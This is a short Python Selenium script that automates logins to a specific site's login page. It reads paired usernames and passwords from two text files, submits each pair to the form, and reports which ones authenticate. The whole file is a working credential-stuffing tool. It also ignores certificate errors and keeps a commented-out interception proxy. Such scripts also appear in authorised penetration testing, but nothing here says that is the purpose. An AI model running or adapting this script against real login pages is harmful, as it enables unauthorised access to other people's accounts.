import time, os
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException


#PROXY = "127.0.0.1:8080" # IP:PORT or HOST:PORT
options = webdriver.ChromeOptions()
#options.add_argument('--proxy-server=%s' % PROXY)
options.add_argument('ignore-certificate-errors')
driver = webdriver.Chrome(options=options)
wait = WebDriverWait(driver, 10)

user_file = open("usernames.txt", "r")
pass_file = open("passwords.txt", "r")
user_list = user_file.readlines()
pass_list = pass_file.readlines()

url = 'https://shape.udoblucher.net/login/?next=/'

for usr, pwd in zip(user_list, pass_list):
  driver.get(url)
  findUsername = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH,"//input[@id='id_username']")))
  findPassword = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH,"//input[@id='id_password']")))
  driver.find_element(By.XPATH, "//input[@id='id_username']").send_keys(usr)
  driver.find_element(By.XPATH, "//input[@id='id_password']").send_keys(pwd)
  driver.find_element(By.CSS_SELECTOR, "button[class*='btn-primary']").click()
  
  try:
    driver.find_element(By.CLASS_NAME, "md-avatar").click()
    print("Success Authentication ->", usr)
  except NoSuchElementException:
    print("Invalid credentials ->", usr)
  
  try:
    driver.find_element(By.LINK_TEXT, 'Logout').click()
  except NoSuchElementException:
    time.sleep(1)
  
driver.quit()